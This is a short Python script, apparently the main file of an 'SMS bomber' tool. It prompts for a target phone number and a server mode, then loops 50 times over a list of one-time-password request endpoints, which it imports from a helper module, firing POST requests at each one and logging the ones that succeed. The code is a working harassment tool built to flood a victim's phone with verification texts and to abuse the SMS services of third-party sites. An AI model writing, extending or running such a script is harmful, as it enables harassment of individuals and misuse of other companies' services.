from api import send_otp_requests
from api import send_otp_requests_json
from welcome import welcome_text
from server import select_server
from number import get_number
from end import bye_text
from log import log
import requests
import pyfiglet
from colorama import Fore,init
init(autoreset=True)

welcome_text()

try:
       server=select_server()
       number=get_number()
       
       if server == 1 :
              apis = send_otp_requests(number)
       elif server == 2 :
              apis = send_otp_requests_json(number)
       
       for m in range(50):
              for url, payload, in apis:
                     try :
                            if(server == 1):
                                   response = requests.post(url,data=payload)
                            elif(server == 2):
                                   response = requests.post(url,json=payload)
                            
                            if(response.status_code == 200):
                                   log(number,url)

                     except requests.exceptions.RequestException:
                            pass

except KeyboardInterrupt:
       bye_text()